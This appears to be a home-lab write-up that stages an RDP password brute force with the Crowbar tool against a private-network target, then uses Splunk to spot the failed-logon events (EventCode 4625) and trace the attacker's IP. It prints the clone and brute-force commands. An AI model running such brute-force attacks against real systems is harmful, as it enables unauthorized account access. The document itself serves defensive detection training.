# Scenario 1 : Remote Access with RDP

Attacker machine: 192.168.10.40
Configuration:
```
sudo nano /etc/netplan/01-network-manager-all.yaml
```
```
network:
	version: 2
	ethernets:
		enp0s3:
			addresses:
				- 192.168.10.40/24
			gateway4: 192.168.10.1
			nameservers:
				addresses: [8.8.8.8]
```

In target-PC:
- Go to Windows Defender Firewall
- Advanced settings
- Authenticate as an Administrator
- Inbound Rules
- Enable File and Printer Sharing (Echo Request-ICMPv4 In)

Then, ping the target-PC ip @ from the attacker machine.

In Attacker Machine:
```
sudo git clone https://github.com/galkan/crowbar.git
```
Add a password list for a brute force attack
```
nano passwords.txt
```
And launch the attack:
```
python3 crowbar.py -b rdp -u user_name -C passwords.txt -s 192.168.10.100/32
```
## Results :
[!Alt text](../../images/attack1.png)

# Audit with Splunk
Splunk is a SIEM tool that centralise logs for every DC machine.
After the attack we go to 192.168.10.10:8000 (our splunk server), and we login with the credentials that we have entered once we installed splunk on ubuntu server

Steps :
- We go to Search & Reporting
- We search for our machines with : index="endpoint" user_name, with the last 15 min research
- We look for EventCode, and we click on it

[!Alt text](/images/logs1.png)

### EventCode Explanation :
In Windows Auditing, EventCode (often called Event ID) is an identifier that tells you what kind of security event happened
In this case, we have EventCode=4625, with 22 Count, that tells An account failed to log on 22 time (Crute Force Attack)

- We click for more details, and we look for the ip @:

[!Alt text](../images/analyse1.png)
And thats is the Attacker ip @.
